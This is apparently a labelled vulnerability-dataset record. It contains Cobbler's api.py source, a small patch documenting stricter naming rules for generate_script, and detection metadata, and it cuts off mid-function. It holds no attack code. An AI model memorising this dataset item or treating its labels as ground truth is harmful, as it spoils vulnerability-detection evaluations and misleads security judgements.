:param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.files().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_menu(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a menu via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.menus().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    # ==========================================================================\n\n    def __since(self, mtime: float, collector, collapse: bool = False) -> list:\n        \"\"\"\n        Called by get_*_since functions. This is an internal part of Cobbler.\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collector: The list of objects to filter after mtime.\n        :param collapse: Whether the object should be collapsed to a dict or not. If not the item objects are used for\n                         the list.\n        :return: The list of objects which are newer then the given timestamp.\n        \"\"\"\n        results1 = collector()\n        results2 = []\n        for x in results1:\n            if x.mtime == 0 or x.mtime >= mtime:\n                if not collapse:\n                    results2.append(x)\n                else:\n                    results2.append(x.to_dict())\n        return results2\n\n    def get_distros_since(self, mtime: float, collapse: bool = False):\n        \"\"\"\n        Returns distros modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: collapse=True specifies returning a dict instead of objects.\n        :return: The list of distros which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.distros, collapse=collapse)\n\n    def get_profiles_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Returns profiles modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of profiles which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.profiles, collapse=collapse)\n\n    def get_systems_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return systems modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of systems which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.systems, collapse=collapse)\n\n    def get_repos_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return repositories modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of repositories which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.repos, collapse=collapse)\n\n    def get_images_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return images modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of images which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.images, collapse=collapse)\n\n    def get_mgmtclasses_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return management classes modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of management classes which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.mgmtclasses, collapse=collapse)\n\n    def get_packages_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return packages modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of packages which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.packages, collapse=collapse)\n\n    def get_files_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return files modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of files which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.files, collapse=collapse)\n\n    def get_menus_since(self, mtime: float, collapse=False) -> list:\n        \"\"\"\n        Return files modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of files which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.menus, collapse=collapse)\n\n    # ==========================================================================\n\n    def get_signatures(self) -> dict:\n        \"\"\"\n        This returns the local signature cache.\n\n        :return: The dict containing all signatures.\n        \"\"\"\n        return utils.SIGNATURE_CACHE\n\n    def signature_update(self):\n        \"\"\"\n        Update all signatures from the URL specified in the settings.\n        \"\"\"\n        try:\n            url = self.settings().signature_url\n            dlmgr = download_manager.DownloadManager(self._collection_mgr)\n            # write temp json file\n            tmpfile = tempfile.NamedTemporaryFile()\n            sigjson = dlmgr.urlread(url)\n            tmpfile.write(sigjson.text.encode())\n            tmpfile.flush()\n            self.logger.debug(\"Successfully got file from %s\" % self.settings().signature_url)\n            # test the import without caching it\n            try:\n                utils.load_signatures(tmpfile.name, cache=False)\n            except:\n                self.logger.error(\"Downloaded signatures failed test load (tempfile = %s)\", tmpfile.name)\n\n            # rewrite the real signature file and import it for real\n            f = open(self.settings().signature_path, \"w\")\n            f.write(sigjson.text)\n            f.close()\n\n            utils.load_signatures(self.settings().signature_path)\n        except:\n            utils.log_exc()\n\n    # ==========================================================================\n\n    def dump_vars(self, obj, formatted_output: bool = False):\n        \"\"\"\n        Dump all known variables related to that object.\n\n        :param obj: The object for which the variables should be dumped.\n        :param formatted_output: If True the values will align in one column and be pretty printed for cli example.\n        :return: A dictionary with all the information which could be collected.\n        \"\"\"\n        return obj.dump_vars(formatted_output)\n\n    # ==========================================================================\n\n    def auto_add_repos(self):\n        \"\"\"\n        Import any repos this server knows about and mirror them. Run ``cobbler reposync`` to apply the changes.\n        Credit: Seth Vidal.\n\n        :raises ImportError\n        \"\"\"\n        self.log(\"auto_add_repos\")\n        try:\n            import dnf\n        except:\n            raise ImportError(\"dnf is not installed\")\n\n        base = dnf.Base()\n        base.read_all_repos()\n        basearch = base.conf.substitutions[\"basearch\"]\n\n        for repository in base.repos.iter_enabled():\n            auto_name = repository.id + '-' + base.conf.releasever + '-' + basearch\n\n            if self.find_repo(auto_name) is None:\n                cobbler_repo = self.new_repo()\n                cobbler_repo.name = auto_name\n                cobbler_repo.breed = enums.RepoBreeds.YUM\n                cobbler_repo.arch = basearch\n                cobbler_repo.comment = repository.name\n                baseurl = repository.baseurl\n                metalink = repository.metalink\n                mirrorlist = repository.mirrorlist\n\n                if metalink is not None:\n                    mirror = metalink\n                    mirror_type = enums.MirrorType.METALINK\n                elif mirrorlist is not None:\n                    mirror = mirrorlist\n                    mirror_type = enums.MirrorType.MIRRORLIST\n                elif len(baseurl) > 0:\n                    mirror = baseurl[0]\n                    mirror_type = enums.MirrorType.BASEURL\n                else:\n                    mirror = \"\"\n                    mirror_type = enums.MirrorType.NONE\n\n                cobbler_repo.mirror = mirror\n                cobbler_repo.mirror_type = mirror_type\n                self.log(\"auto repo adding: %s\" % auto_name)\n                self.add_repo(cobbler_repo)\n            else:\n                self.log(\"auto repo adding: %s - exists\" % auto_name)\n\n    # ==========================================================================\n\n    def get_repo_config_for_profile(self, obj) -> str:\n        \"\"\"\n        Get the repository configuration for the specified profile\n\n        :param obj: The profile to return the configuration for.\n        :return: The repository configuration as a string.\n        \"\"\"\n        return self.yumgen.get_yum_config(obj, True)\n\n    def get_repo_config_for_system(self, obj) -> str:\n        \"\"\"\n        Get the repository configuration for the specified system.\n\n        :param obj: The system to return the configuration for.\n        :return: The repository configuration as a string.\n        \"\"\"\n        return self.yumgen.get_yum_config(obj, False)\n\n    # ==========================================================================\n\n    def get_template_file_for_profile(self, obj, path) -> str:\n        \"\"\"\n        Get the template for the specified profile.\n\n        :param obj: The object which is related to that template.\n        :param path: The path to the template.\n        :return: The template as in its string representation.\n        \"\"\"\n        template_results = self.tftpgen.write_templates(obj, False, path)\n        if path in template_results:\n            return template_results[path]\n        else:\n            return \"# template path not found for specified profile\"\n\n    def get_template_file_for_system(self, obj, path):\n        \"\"\"\n        Get the template for the specified system.\n\n        :param obj: The object which is related to that template.\n        :param path: The path to the template.\n        :return: The template as in its string representation.\n        \"\"\"\n        template_results = self.tftpgen.write_templates(obj, False, path)\n        if path in template_results:\n            return template_results[path]\n        else:\n            return \"# template path not found for specified system\"\n\n    # ==========================================================================\n\n    def generate_ipxe(self, profile: str, image: str, system: str) -> str:\n        \"\"\"\n        Generate the ipxe configuration files. The system wins over the profile. Profile and System win over Image.\n\n        :param profile: The profile to return the configuration for.\n        :param image: The image to return the configuration for.\n        :param system: The system to return the configuration for.\n        :return: The generated configuration file.\n        \"\"\"\n        self.log(\"generate_ipxe\")\n        data = \"\"\n        if profile is None and image is None and system is None:\n            boot_menu = self.tftpgen.make_pxe_menu()\n            if 'ipxe' in boot_menu:\n                data = boot_menu['ipxe']\n        elif system:\n            data = self.tftpgen.generate_ipxe(\"system\", system)\n        elif profile:\n            data = self.tftpgen.generate_ipxe(\"profile\", profile)\n        elif image:\n            data = self.tftpgen.generate_ipxe(\"image\", image)\n        return data\n\n    # ==========================================================================\n\n    def generate_bootcfg(self, profile: str, system: str) -> str:\n        \"\"\"\n        Generate a boot configuration. The system wins over the profile.\n\n        :param profile: The profile to return the configuration for.\n        :param system: The system to return the configuration for.\n        :return: The generated configuration file.\n        \"\"\"\n        self.log(\"generate_bootcfg\")\n        if system:\n            return self.tftpgen.generate_bootcfg(\"system\", system)\n        else:\n            return self.tftpgen.generate_bootcfg(\"profile\", profile)\n\n    # ==========================================================================\n\n    def generate_script(self, profile: Optional[str], system: Optional[str], name: str):\n        \"\"\"\n        Generate an autoinstall script for the specified profile or system. The system wins over the profile.\n\n        :param profile: The profile name to generate the script for.\n        :param system: The system name to generate the script for.\n        :param name: The name of the script which should be generated. Must only contain alphanumeric characters, dots\n                     and underscores.\n        :return: The generated script or an error message.\n        \"\"\"\n        self.log(\"generate_script\")\n        if system:\n            return self.tftpgen.generate_script(\"system\", system, name)\n        else:\n            return self.tftpgen.generate_script(\"profile\", profile, name)\n\n    # ==========================================================================\n\n    def check(self) -> Union[None, list]:\n        \"\"\"\n        See if all preqs for network booting are valid. This returns a list of strings containing instructions on things\n        to correct. An empty list means there is nothing to correct, but that still doesn't mean there are configuration\n        errors. This is mainly useful for human admins, who may, for instance, forget to properly set up their TFTP\n        servers for PXE, etc.\n\n        :return: None or a list of things to address.\n        \"\"\"\n        self.log(\"check\")\n        action_check = check.CobblerCheck(self._collection_mgr)\n        return action_check.run()\n\n    # ==========================================================================\n\n    def validate_autoinstall_files(self):\n        \"\"\"\n        Validate if any of the autoinstallation files are invalid and if yes report this.\n\n        \"\"\"\n        self.log(\"validate_autoinstall_files\")\n        autoinstall_mgr = autoinstall_manager.AutoInstallationManager(self._collection_mgr)\n        autoinstall_mgr.validate_autoinstall_files()\n\n    # ==========================================================================\n\n    def sync_systems(self, systems: List[str], verbose: bool = False):\n        \"\"\"\n        Take the values currently written to the configuration files in /etc, and /var, and build out the information\n        tree found in /tftpboot. Any operations done in the API that have not been saved with serialize() will NOT be\n        synchronized with this command.\n\n        :param systems: List of specified systems that needs to be synced\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        \"\"\"\n        self.log(\"sync_systems\")\n        if not (systems and isinstance(systems, list) and all(isinstance(sys_name, str) for sys_name in systems)):\n            raise TypeError('Systems must be a list of one or more strings.')\n        sync_obj = self.get_sync(verbose=verbose)\n        sync_obj.run_sync_systems(systems)\n\n    # ==========================================================================\n\n    def sync(self, verbose: bool = False, what: Optional[list] = None):\n        \"\"\"\n        Take the values currently written to the configuration files in /etc, and /var, and build out the information\n        tree found in /tftpboot. Any operations done in the API that have not been saved with serialize() will NOT be\n        synchronized with this command.\n\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        :param what:   List of strings what services to sync (e.g. dhcp and/or dns). Empty list for full sync.\n        \"\"\"\n        # Empty what: Full sync\n        if not what:\n            self.logger.info(\"syncing all\")\n            sync_obj = self.get_sync(verbose=verbose)\n            sync_obj.run()\n            return\n        # Non empty what: Specific sync\n        if not isinstance(what, list):\n            raise TypeError(\"'what' needs to be of type list!\")\n        if 'dhcp' in what:\n            self.sync_dhcp()\n        if 'dns' in what:\n            self.sync_dns()\n\n    # ==========================================================================\n\n    def sync_dns(self):\n        \"\"\"\n        Only build out the DNS configuration.\n        \"\"\"\n        if not self.settings().manage_dns:\n            self.logger.error(\"manage_dns not set\")\n            return\n        self.logger.info(\"sync_dns\")\n        dns_module = self.get_module_from_file(\n            \"dns\",\n            \"module\",\n            \"managers.bind\"\n        )\n        dns = dns_module.get_manager(self._collection_mgr)\n        dns.sync()\n\n    # ==========================================================================\n\n    def sync_dhcp(self):\n        \"\"\"\n        Only build out the DHCP configuration.\n        \"\"\"\n        if not self.settings().manage_dhcp:\n            self.logger.error(\"manage_dhcp not set\")\n            return\n        self.logger.info(\"sync_dhcp\")\n        dhcp_module = self.get_module_from_file(\n            \"dhcp\",\n            \"module\",\n            \"managers.isc\"\n        )\n        dhcp = dhcp_module.get_manager(self._collection_mgr)\n        dhcp.sync()\n\n    # ==========================================================================\n\n    def get_sync(self, verbose: bool = False):\n        \"\"\"\n        Get a Cobbler Sync object which may be executed through the call of ``obj.run()``.\n\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        :return: An instance of the CobblerSync class to execute the sync with.\n        \"\"\"\n        if not isinstance(verbose, bool):\n            raise TypeError(\"get_sync: verbose parameter needs to be of type bool!\")\n        dhcp = self.get_module_from_file(\n            \"dhcp\",\n            \"module\",\n            \"managers.isc\"\n        ).get_manager(self._collection_mgr)\n        dns = self.get_module_from_file(\n            \"dns\",\n            \"module\",\n            \"managers.bind\"\n        ).get_manager(self._collection_mgr)\n        tftpd = self.get_module_from_file(\n            \"tftpd\",\n            \"module\",\n            \"managers.in_tftpd\",\n        ).get_manager(self._collection_mgr)\n\n        return sync.CobblerSync(self._collection_mgr, dhcp=dhcp, dns=dns, tftpd=tftpd, verbose=verbose)\n\n    # ==========================================================================\n\n    def reposync(self, name: Optional[str] = None, tries: int = 1, nofail: bool = False):\n        \"\"\"\n        Take the contents of ``/var/lib/cobbler/repos`` and update them -- or create the initial copy if no contents\n        exist yet.\n\n        :param name: The name of the repository to run reposync for.\n        :param tries: How many tries should be executed before the action fails.\n        :param nofail: If True then the action will fail, otherwise the action will just be skipped. This respects the\n                       ``tries`` parameter.\n        \"\"\"\n        self.log(\"reposync\", [name])\n        action_reposync = reposync.RepoSync(self._collection_mgr, tries=tries, nofail=nofail)\n        action_reposync.run(name)\n\n    # ==========================================================================\n\n    def status(self, mode: str):\n        \"\"\"\n        Get the status of the current Cobbler instance.\n\n        :param mode: \"text\" or anything else. Meaning whether the output is thought for the terminal or not.\n        :return: The current status of Cobbler.\n        \"\"\"\n        statusifier = status.CobblerStatusReport(self._collection_mgr, mode)\n        return statusifier.run()\n\n    # ==========================================================================\n\n    def import_tree(self, mirror_url: str, mirror_name: str, network_root=None, autoinstall_file=None, rsync_flags=None,\n                    arch=None, breed=None, os_version=None) -> bool:\n        \"\"\"\n        Automatically import a directory tree full of distribution files.\n\n        :param mirror_url: Can be a string that represents a path, a user@host syntax for SSH, or an rsync:// address.\n                           If mirror_url is a filesystem path and mirroring is not desired, set network_root to\n                           something like \"nfs://path/to/mirror_url/root\"\n        :param mirror_name: The name of the mirror.\n        :param network_root:\n        :param autoinstall_file:\n        :param rsync_flags:\n        :param arch:\n        :param breed:\n        :param os_version:\n        \"\"\"\n        self.log(\"import_tree\", [mirror_url, mirror_name, network_root, autoinstall_file, rsync_flags])\n\n        # Both --path and --name are required arguments.\n        if mirror_url is None or not mirror_url:\n            self.log(\"import failed.  no --path specified\")\n            return False\n        if mirror_name is None or not mirror_name:\n            self.log(\"import failed.  no --name specified\")\n            return False\n\n        path = os.path.normpath(\"%s/distro_mirror/%s\" % (self.settings().webdir, mirror_name))\n        if arch is not None:\n            arch = arch.lower()\n            if arch == \"x86\":\n                # be consistent\n                arch = \"i386\"\n            if path.split(\"-\")[-1] != arch:\n                path += (\"-%s\" % arch)\n\n        # We need to mirror (copy) the files.\n        self.log(\"importing from a network location, running rsync to fetch the files first\")\n\n        utils.mkdir(path)\n\n        # Prevent rsync from creating the directory name twice if we are copying via rsync.\n\n        if not mirror_url.endswith(\"/\"):\n            mirror_url = \"%s/\" % mirror_url\n\n        if mirror_url.startswith(\"http://\") or mirror_url.startswith(\"https://\") or mirror_url.startswith(\"ftp://\") \\\n                or mirror_url.startswith(\"nfs://\"):\n            # HTTP mirrors are kind of primative. rsync is better. That's why this isn't documented in the manpage and\n            # we don't support them.\n            # TODO: how about adding recursive FTP as an option?\n            self.log(\"unsupported protocol\")\n            return False\n        else:\n            # Good, we're going to use rsync.. We don't use SSH for public mirrors and local files.\n            # Presence of user@host syntax means use SSH\n            spacer = \"\"\n            if not mirror_url.startswith(\"rsync://\") and not mirror_url.startswith(\"/\"):\n                spacer = ' -e \"ssh\" '\n            rsync_cmd = RSYNC_CMD\n            if rsync_flags:\n                rsync_cmd += \" \" + rsync_flags\n\n            # If --available-as was specified, limit the files we pull down via rsync to just those that are critical\n            # to detecting what the distro is\n            if network_root is not None:\n                rsync_cmd += \" --include-from=/etc/cobbler/import_rsync_whitelist\"\n\n            # kick off the rsync now\n            utils.run_this(rsync_cmd, (spacer, mirror_url, path))\n\n        if network_root is not None:\n            # In addition to mirroring, we're going to assume the path is available over http, ftp, and nfs, perhaps on\n            # an external filer. Scanning still requires --mirror is a filesystem path, but --available-as marks the\n            # network path. This allows users to point the path at a directory containing just the network boot files\n            # while the rest of the distro files are available somewhere else.\n\n            # Find the filesystem part of the path, after the server bits, as each distro URL needs to be calculated\n            # relative to this.\n\n            if not network_root.endswith(\"/\"):\n                network_root += \"/\"\n            valid_roots = [\"nfs://\", \"ftp://\", \"http://\", \"https://\"]\n            for valid_root in valid_roots:\n                if network_root.startswith(valid_root):\n                    break\n            else:\n                self.log(\"Network root given to --available-as must be nfs://, ftp://, http://, or https://\")\n                return False\n\n            if network_root.startswith(\"nfs://\"):\n                try:\n                    (a, b, rest) = network_root.split(\":\", 3)\n                except:\n                    self.log(\"Network root given to --available-as is missing a colon, please see the manpage example.\")\n                    return False\n\n        import_module = self.get_module_by_name(\"managers.import_signatures\") \\\n            .get_import_manager(self._collection_mgr)\n        import_module.run(path, mirror_name, network_root, autoinstall_file, arch, breed, os_version)\n        return True\n\n    # ==========================================================================\n\n    def acl_config(self, adduser: Optional[str] = None, addgroup: Optional[str] = None,\n                   removeuser: Optional[str] = None, removegroup: Optional[str] = None):\n        \"\"\"\n        Configures users/groups to run the Cobbler CLI as non-root.\n        Pass in only one option at a time. Powers ``cobbler aclconfig``.\n\n        :param adduser:\n        :param addgroup:\n        :param removeuser:\n        :param removegroup:\n        \"\"\"\n        action_acl = acl.AclConfig(self._collection_mgr)\n        action_acl.run(\n            adduser=adduser,\n            addgroup=addgroup,\n            removeuser=removeuser,\n            removegroup=removegroup\n        )\n\n    # ==========================================================================\n\n    def serialize(self):\n        \"\"\"\n        Save the cobbler_collections to disk.\n        Cobbler internal use only.\n        \"\"\"\n        self._collection_mgr.serialize()\n\n    def deserialize(self):\n        \"\"\"\n        Load cobbler_collections from disk.\n        Cobbler internal use only.\n        \"\"\"\n        return self._collection_mgr.deserialize()\n\n    # ==========================================================================\n\n    def get_module_by_name(self, module_name: str):\n        \"\"\"\n        Returns a loaded Cobbler module named 'name', if one exists, else None.\n        Cobbler internal use only.\n\n        :param module_name:\n        :return:\n        \"\"\"\n        return module_loader.get_module_by_name(module_name)\n\n    def get_module_from_file(self, section: str, name: str, fallback: Optional[str] = None):\n        \"\"\"\n        Looks in ``/etc/cobbler/modules.conf`` for a section called 'section' and a key called 'name', and then returns\n        the module that corresponds to the value of that key.\n        Cobbler internal use only.\n\n        :param section:\n        :param name:\n        :param fallback:\n        :return:\n        \"\"\"\n        return module_loader.get_module_from_file(section, name, fallback)\n\n    def get_module_name_from_file(self, section: str, name: str, fallback: Optional[str] = None):\n        \"\"\"\n        Looks up a module the same as ``get_module_from_file`` but returns the module name rather than the module\n        itself.\n\n        :param section:\n        :param name:\n        :param fallback:\n        :return:\n        \"\"\"\n        return module_loader.get_module_name(section, name, fallback)\n\n    def get_modules_in_category(self, category: str):\n        \"\"\"\n        Returns all modules in a given category, for instance \"serializer\", or \"cli\".\n        Cobbler internal use only.\n\n        :param category: The category to check.\n        :return: The list of modules.\n        \"\"\"\n        return module_loader.get_modules_in_category(category)\n\n    # ==========================================================================\n\n    def authenticate(self, user: str, password: str):\n        \"\"\"\n        (Remote) access control. This depends on the chosen authentication module.\n        Cobbler internal use only.\n\n        :param user: The username to check for authentication.\n        :param password: The password to check for authentication.\n        :return: Whether the action succeeded or not.\n        \"\"\"\n        rc = self.authn.authenticate(self, user, password)\n        self.log(\"authenticate\", [user, rc])\n        return rc\n\n    def authorize(self, user: str, resource: str, arg1=None, arg2=None):\n        \"\"\"\n        (Remote) access control. This depends on the chosen authorization module.\n        Cobbler internal use only.\n\n        :param user: The username to check for authorization.\n        :param resource: The type of resource which should be checked for access from the supplied user.\n        :param arg1: The actual resource to check for authorization.\n        :param arg2: Not known what this parameter does exactly.\n        :return: The return code of the action.\n        \"\"\"\n        rc = self.authz.authorize(self, user, resource, arg1, arg2)\n        self.log(\"authorize\", [user, resource, arg1, arg2, rc], debug=True)\n        return rc\n\n    # ==========================================================================\n\n    def build_iso(self, iso=None, profiles=None, systems=None, buildisodir=None, distro=None, standalone=None,\n                  airgapped=None, source=None, exclude_dns=None, xorrisofs_opts=None):\n        \"\"\"\n        Build an iso image which may be network bootable or not.\n\n        :param iso:\n        :param profiles:\n        :param systems:\n        :param buildisodir:\n        :param distro:\n        :param standalone:\n        :param airgapped:\n        :param source:\n        :param exclude_dns:\n        :param xorrisofs_opts:\n        \"\"\"\n        builder = buildiso.BuildIso(self._collection_mgr)\n        builder.run(\n            iso=iso, profiles=profiles, systems=systems, buildisodir=buildisodir, distro=distro, standalone=standalone,\n            airgapped=airgapped, source=source, exclude_dns=exclude_dns, xorrisofs_opts=xorrisofs_opts\n        )\n\n    # ==========================================================================\n\n    def hardlink(self):\n        \"\"\"\n        Hardlink all files where this is possible to improve performance.\n\n        :return: The return code of the subprocess call which actually hardlinks the files.\n        \"\"\"\n        linker = hardlink.HardLinker(api=self)\n        return linker.run()\n\n    # ==========================================================================\n\n    def replicate(self, cobbler_master: Optional[str] = None, port: str = \"80\", distro_patterns: str = \"\",\n                  profile_patterns: str = \"\", system_patterns: str = \"\", repo_patterns: str = \"\",\n                  image_patterns: str = \"\", mgmtclass_patterns=None, package_patterns=None, file_patterns: bool = False,\n                  prune: bool = False, omit_data: bool = False, sync_all: bool = False, use_ssl: bool = False):\n        \"\"\"\n        Pull down data/configs from a remote Cobbler server that is a master to this server.\n\n        :param cobbler_master: The hostname/URL of the other Cobbler server\n        :param port: The port to use for the replication task.\n        :param distro_patterns: The pattern of distros which should be synced.\n        :param profile_patterns: The pattern of profiles which should be synced.\n        :param system_patterns: The pattern of systems which should be synced.\n        :param repo_patterns: The pattern of repositories which should be synced.\n        :param image_patterns: The pattern of images which should be synced.\n        :param mgmtclass_patterns: The pattern of management classes which should be synced.\n        :param package_patterns: The pattern of packages which should be synced.\n        :param file_patterns: The pattern of files which should be synced.\n        :param prune: Whether the object not on the master should be removed or not.\n        :param omit_data: If the data downloaded by the current Cobbler server should be rsynced to the destination\n                          server.\n        :param sync_all: This parameter behaves similarly to a dry run argument. If True then everything will executed,\n                         if False then only some things are synced.\n        :param use_ssl: Whether SSL should be used (True) or not (False).\n        \"\"\"\n        replicator = replicate.Replicate(self._collection_mgr)\n        return replicator.run(\n            cobbler_master=cobbler_master, port=port, distro_patterns=distro_patterns,\n            profile_patterns=profile_patterns, system_patterns=system_patterns, repo_patterns=repo_patterns,\n            image_patterns=image_patterns, mgmtclass_patterns=mgmtclass_patterns, package_patterns=package_patterns,\n            file_patterns=file_patterns, prune=prune, omit_data=omit_data, sync_all=sync_all, use_ssl=use_ssl\n        )\n\n    # ==========================================================================\n\n    def report(self, report_what: Optional[str] = None, report_name: Optional[str] = None,\n               report_type: Optional[str] = None, report_fields: Optional[str] = None,\n               report_noheaders: Optional[bool] = None):\n        \"\"\"\n        Report functionality for Cobbler.\n\n        :param report_what: The object type that should be reported.\n        :param report_name: The name of the object which should be possibly reported.\n        :param report_type: May be either \"text\", \"csv\", \"mediawiki\", \"trac\" or \"doku\".\n        :param report_fields: Specify \"all\" or the fields you want to be reported.\n        :param report_noheaders: If the column headers should be included in the output or not.\n        \"\"\"\n        reporter = report.Report(self._collection_mgr)\n        return reporter.run(report_what=report_what, report_name=report_name, report_type=report_type,\n                            report_fields=report_fields, report_noheaders=report_noheaders)\n\n    # ==========================================================================\n\n    def power_system(self, system: str, power_operation: str, user: Optional[str] = None,\n                     password: Optional[str] = None):\n        \"\"\"\n        Power on / power off / get power status /reboot a system.\n\n        :param system: Cobbler system\n        :param power_operation: power operation. Valid values: on, off, reboot, status\n        :param user: power management user\n        :param password: power management password\n        :return: bool if operation was successful\n        \"\"\"\n\n        if power_operation == \"on\":\n            self.power_mgr.power_on(system, user=user, password=password)\n        elif power_operation == \"off\":\n            self.power_mgr.power_off(system, user=user, password=password)\n        elif power_operation == \"status\":\n            return self.power_mgr.get_power_status(system, user=user, password=password)\n        elif power_operation == \"reboot\":\n            self.power_mgr.reboot(system, user=user, password=password)\n        else:\n            utils.die(\"invalid power operation '%s', expected on/off/status/reboot\" % power_operation)\n        return None\n\n    # ==========================================================================\n\n    def clear_logs(self, system):\n        \"\"\"\n        Clears console and anamon logs for system\n\n        :param system: The system to clear logs of.\n        \"\"\"\n        log.LogTool(self._collection_mgr, system, self).clear()\n\n    # ==========================================================================\n\n    def get_valid_obj_boot_loaders(self, obj) -> List[str]:\n        \"\"\"\n        Return the list of valid boot loaders for the object\n\n        :param obj: The object for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.\n        \"\"\"\n        return obj.supported_boot_loaders\n\n    # ==========================================================================\n\n    def create_grub_images(self):\n        \"\"\"\n        Create the GRUB installer images via this API call. It utilizes ``grub2-mkimage`` behind the curtain.\n        \"\"\"\n        action = grubimage.GrubImage(self)\n        action.run()\n", "patch": "@@ -178,6 +178,7 @@ def last_modified_time(self) -> float:\n \n         :returns: 0 if there is no file where the information required for this method is saved.\n         \"\"\"\n+        # FIXME: This fails in case the file required is not available\n         if not os.path.exists(\"/var/lib/cobbler/.mtime\"):\n             fd = open(\"/var/lib/cobbler/.mtime\", 'w')\n             fd.write(\"0\")\n@@ -1317,13 +1318,14 @@ def generate_bootcfg(self, profile: str, system: str) -> str:\n \n     # ==========================================================================\n \n-    def generate_script(self, profile: str, system: str, name: str) -> str:\n+    def generate_script(self, profile: Optional[str], system: Optional[str], name: str):\n         \"\"\"\n         Generate an autoinstall script for the specified profile or system. The system wins over the profile.\n \n-        :param profile: The profile to generate the script for.\n-        :param system: The system to generate the script for.\n-        :param name: The name of the script which should be generated.\n+        :param profile: The profile name to generate the script for.\n+        :param system: The system name to generate the script for.\n+        :param name: The name of the script which should be generated. Must only contain alphanumeric characters, dots\n+                     and underscores.\n         :return: The generated script or an error message.\n         \"\"\"\n         self.log(\"generate_script\")", "file_path": "files/2021_10/1105", "file_language": "py", "file_name": "cobbler/api.py", "outdated_file_modify": 0, "outdated_file_before": 0, "outdated_file_after": 0, "llm_check": 0, "static_check": 0, "static": {"rats": [false, []], "semgrep": [false, []]}, "target": 0, "function_before": [{"function": "class CobblerAPI:\n    \"\"\"\n    Python API module for Cobbler.\n    See source for cobbler.py, or pydoc, for example usage.\n    Cli apps and daemons should import api.py, and no other Cobbler code.\n    \"\"\"\n    __shared_state = {}\n    __has_loaded = False\n\n    def __init__(self, is_cobblerd: bool = False, settingsfile_location: str = \"/etc/cobbler/settings.yaml\",\n                 execute_settings_automigration: bool = True):\n        \"\"\"\n        Constructor\n\n        :param is_cobblerd: Wether this API is run as a daemon or not.\n        :param settingsfile_location: The location of the settings file on the disk.\n        \"\"\"\n\n        # FIXME: this should be switchable through some simple system\n\n        self.__dict__ = CobblerAPI.__shared_state\n        self.perms_ok = False\n        if not CobblerAPI.__has_loaded:\n            # NOTE: we do not log all API actions, because a simple CLI invocation may call adds and such to load the\n            # config, which would just fill up the logs, so we'll do that logging at CLI level (and remote.py web\n            # service level) instead.\n\n            random.seed()\n            self.is_cobblerd = is_cobblerd\n            if is_cobblerd:\n                main_thread = threading.main_thread()\n                main_thread.setName(\"Daemon\")\n\n            self.logger = logging.getLogger()\n\n            # FIXME: consolidate into 1 server instance\n\n            self.selinux_enabled = utils.is_selinux_enabled()\n            self.dist, self.os_version = utils.os_release()\n            self._settings = self.__generate_settings(pathlib.Path(settingsfile_location),\n                                                      execute_settings_automigration)\n\n            CobblerAPI.__has_loaded = True\n\n            # load the modules first, or nothing else works...\n            module_loader.load_modules()\n\n            # import signatures\n            try:\n                